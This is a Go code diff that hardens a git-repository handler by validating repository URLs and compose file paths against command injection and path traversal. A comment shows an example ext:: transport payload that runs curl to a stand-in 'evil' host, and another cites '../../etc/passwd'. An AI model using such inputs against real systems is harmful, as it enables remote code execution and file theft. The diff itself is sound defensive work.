@@ -7,7 +7,9 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"net/url"
 	"os"
+	"regexp"
 	"os/exec"
 	"path/filepath"
 	"strings"
@@ -152,6 +154,10 @@ func (h *GitReposHandler) TestCredential(w http.ResponseWriter, r *http.Request)
 		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "repo_url required for test"})
 		return
 	}
+	if err := validateRepoURL(req.RepoURL); err != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": err.Error()})
+		return
+	}
 
 	cred, err := h.loadCredential(req.CredentialID)
 	if err != nil {
@@ -163,7 +169,7 @@ func (h *GitReposHandler) TestCredential(w http.ResponseWriter, r *http.Request)
 	env := buildCredentialEnv(cred)
 	defer cleanupAskpass()
 
-	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
 	defer cancel()
 
 	cmd := exec.CommandContext(ctx, "git", "ls-remote", "--heads", req.RepoURL)
@@ -293,11 +299,22 @@ func (h *GitReposHandler) SaveRepo(w http.ResponseWriter, r *http.Request) {
 		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "repo_url is required"})
 		return
 	}
+	if err := validateRepoURL(req.RepoURL); err != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": err.Error()})
+		return
+	}
 	if req.Branch == "" {
 		req.Branch = "main"
 	}
 	if req.ComposePath == "" {
 		req.ComposePath = "docker-compose.yml"
+	}
+	// Validate compose path to prevent path traversal — validate against a placeholder
+	// root since local_path is computed from name (not stored yet)
+	placeholderRoot := "/var/lib/dplaneos/git-stacks/" + sanitizeName(req.Name)
+	if _, err := validateComposePath(placeholderRoot, req.ComposePath); err != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + err.Error()})
+		return
 	}
 	if req.SyncInterval < 1 {
 		req.SyncInterval = 5
@@ -439,7 +456,12 @@ func (h *GitReposHandler) PushRepo(w http.ResponseWriter, r *http.Request) {
 	runGitInDir(repo.LocalPath, nil, "config", "user.name", repo.CommitName)
 	runGitInDir(repo.LocalPath, nil, "config", "user.email", repo.CommitEmail)
 
-	// Stage only the compose file (not entire repo)
+	// Stage only the compose file (not entire repo) — validate path first
+	_, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
+	if pathErr != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
+		return
+	}
 	runGitInDir(repo.LocalPath, nil, "add", repo.ComposePath)
 
 	commitOut, commitErr := runGitInDir(repo.LocalPath, nil, "commit", "-m", req.Message)
@@ -481,16 +503,14 @@ func (h *GitReposHandler) DeployRepo(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	composeFull := filepath.Join(repo.LocalPath, repo.ComposePath)
+	composeFull, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
+	if pathErr != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
+		return
+	}
 	if _, err := os.Stat(composeFull); err != nil {
 		respondJSON(w, 400, map[string]interface{}{"success": false,
 			"error": fmt.Sprintf("Compose file not found at %s — pull first", composeFull)})
-		return
-	}
-
-	// Path safety: must be under /var/lib/dplaneos/git-stacks/
-	if !strings.HasPrefix(composeFull, "/var/lib/dplaneos/git-stacks/") {
-		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Compose path must be within the managed git-stacks directory"})
 		return
 	}
 
@@ -556,7 +576,11 @@ func (h *GitReposHandler) ExportToRepo(w http.ResponseWriter, r *http.Request) {
 	yaml := gsh.generateCompose(containers)
 
 	// Write to repo
-	composeFull := filepath.Join(repo.LocalPath, repo.ComposePath)
+	composeFull, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
+	if pathErr != nil {
+		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
+		return
+	}
 	os.MkdirAll(filepath.Dir(composeFull), 0755)
 	if err := os.WriteFile(composeFull, []byte(yaml), 0644); err != nil {
 		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Failed to write compose file"})
@@ -656,6 +680,50 @@ func buildCredentialEnv(cred *gitCredential) []string {
 	return nil
 }
 
+
+// validateRepoURL validates a Git repository URL.
+//
+// Security: git's ext:: transport allows arbitrary command execution:
+//   ext::sh -c 'curl http://evil/$HOSTNAME' → RCE as the daemon user.
+// file:// allows reading local files outside the expected paths.
+//
+// Allowed schemes: https://, http://, git://, ssh://, git@ (SCP syntax)
+// Blocked: ext::, file://, fd::, and anything that doesn't match the allowlist.
+func validateRepoURL(rawURL string) error {
+	if rawURL == "" {
+		return fmt.Errorf("repo_url is required")
+	}
+	if len(rawURL) > 512 {
+		return fmt.Errorf("repo_url too long (max 512 chars)")
+	}
+
+	// SCP-style git@host:path — validate before trying to parse as URL
+	scpRe := regexp.MustCompile(`^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[a-zA-Z0-9._/~-]`)
+	if scpRe.MatchString(rawURL) {
+		return nil
+	}
+
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return fmt.Errorf("invalid repo URL: %w", err)
+	}
+
+	switch strings.ToLower(u.Scheme) {
+	case "https", "http", "git", "ssh":
+		// allowed
+	case "":
+		return fmt.Errorf("repo URL must include a scheme (https://, ssh://, git@...)")
+	default:
+		return fmt.Errorf("repo URL scheme %q is not allowed (use https://, ssh://, or git@)", u.Scheme)
+	}
+
+	if u.Host == "" {
+		return fmt.Errorf("repo URL must include a host")
+	}
+
+	return nil
+}
+
 func runGitInDir(dir string, env []string, args ...string) (string, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
@@ -704,4 +772,30 @@ func sanitizeName(name string) string {
 		}
 	}
 	return sb.String()
+}
+
+// validateComposePath ensures the compose file path from the user cannot escape the
+// repository's local directory via path traversal (e.g. "../../etc/passwd").
+//
+// Rules:
+//   - Must be a relative path (no leading slash)
+//   - After filepath.Clean, must still be inside the repo root
+//   - No null bytes
+//
+// Returns the cleaned, validated absolute path ready for os.Stat/WriteFile.
+func validateComposePath(localPath, composePath string) (string, error) {
+	if strings.ContainsRune(composePath, 0) {
+		return "", fmt.Errorf("compose_path contains null byte")
+	}
+	if filepath.IsAbs(composePath) {
+		return "", fmt.Errorf("compose_path must be relative (no leading slash)")
+	}
+	// filepath.Clean resolves ".." components
+	cleaned := filepath.Clean(composePath)
+	full := filepath.Join(localPath, cleaned)
+	// After joining, the result must still be under localPath
+	if !strings.HasPrefix(full+string(filepath.Separator), localPath+string(filepath.Separator)) {
+		return "", fmt.Errorf("compose_path escapes repository directory (path traversal attempt)")
+	}
+	return full, nil
 }
